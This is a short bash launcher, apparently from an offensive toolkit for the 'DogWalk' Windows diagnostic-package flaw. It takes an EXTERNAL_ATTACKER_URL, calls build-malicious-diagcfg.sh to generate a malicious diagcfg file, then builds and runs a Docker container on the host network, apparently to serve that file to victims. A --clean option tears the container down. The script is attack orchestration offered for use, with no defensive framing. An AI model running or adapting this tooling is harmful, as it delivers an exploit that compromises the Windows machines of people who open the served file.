#!/bin/bash

if [ $# -lt 1 ];then
  echo "Usage: ./hurry-dogwalk.sh [EXTERNAL_ATTACKER_URL] or stop serving ./hurry-dogwalk.sh --clean" 
else
  if [[ $1 == "--clean" ]]; then
    ID=$(docker ps -a -q --filter ancestor=ariary/dogwalk --format="{{.ID}}")
    IDSTOP=$(docker stop $ID)
    docker rmi -f ariary/dogwalk
  else
    ./build-malicious-diagcfg.sh --url $1
  #   DOCKER_BUILDKIT=0 docker build -t ariary/dogwalk .
    docker build -t ariary/dogwalk .
    docker run -it --rm --net host ariary/dogwalk
  fi
fi
